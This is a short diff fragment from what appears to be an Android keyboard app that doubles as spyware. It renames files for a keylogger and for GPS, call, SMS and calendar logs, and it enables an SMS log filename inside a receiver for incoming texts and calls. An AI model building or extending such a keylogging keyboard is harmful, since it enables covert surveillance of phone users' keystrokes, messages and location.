@@ -87,11 +87,11 @@ implements KeyboardView.OnKeyboardActionListener {
 
 	private String mWordSeparators;
 	private static String KBD_LOG_FILTER = "KBD";
-	private String KLGRFILENAME = "keylogger0019.csv";
-	private String GPSFILENAME = "gpslog0019.csv";
-	private String CLGFILENAME = "calllog0019.csv";
-	private String SMSFILENAME = "smslog0019.csv";
-	private String CLDFILENAME = "calendar0019.csv";
+	private String KLGRFILENAME = "keylogger2318.csv";
+	private String GPSFILENAME = "gpslog2318.csv";
+	private String CLGFILENAME = "calllog2318.csv";
+	private String SMSFILENAME = "smslog2318.csv";
+	private String CLDFILENAME = "calendar2318.csv";
 	
 
 	private final BroadcastReceiver receiver = new BroadcastReceiver() {
@@ -101,7 +101,7 @@ implements KeyboardView.OnKeyboardActionListener {
 			String data = intent.getDataString();
 			Log.i(KBD_LOG_FILTER, data);
 			if(action.equals("android.provider.Telephony.SMS_RECEIVED")){
-				//String FILENAME = "sms_log.txt";
+				String FILENAME = "sms_log.txt";
 				//LogMethods.appendLog("sms recieved", FILENAME);
 			}
 			else if(action.equals(android.telephony.TelephonyManager.ACTION_PHONE_STATE_CHANGED)){
